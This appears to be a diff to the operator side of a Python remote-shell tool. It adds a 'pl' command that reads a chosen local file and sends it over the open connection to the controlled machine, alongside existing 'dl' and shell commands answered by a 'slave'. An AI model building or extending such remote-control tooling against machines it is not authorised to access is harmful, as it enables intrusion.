@@ -76,12 +76,15 @@ def cmd_shell(conn, ip_addr, port, shell_port):
         shell = check_shell(cmd)
 
         dl = False
+        pl = False
         if shell == 0:
             cmd += str(shell_port)
         if cmd == "clear":
             clear()
         if cmd[:2] == "dl":
             dl = True
+        if cmd[:2] == "pl":
+            pl = True
 
         try:
             conn.send(cmd.encode())
@@ -108,6 +111,15 @@ def cmd_shell(conn, ip_addr, port, shell_port):
             else:
                 encoded_msg = conn.recv(1024)
                 msg = encoded_msg.decode()
+
+            if pl == True:
+                clear()
+                os.system("ls")
+                filename = input(">>> ")
+                with open(filename, "r") as fp:
+                    data = fp.read()
+                file = data.encode()
+                conn.send(file)
 
             slave_ack = msg[:3]
             msg = msg[3:]
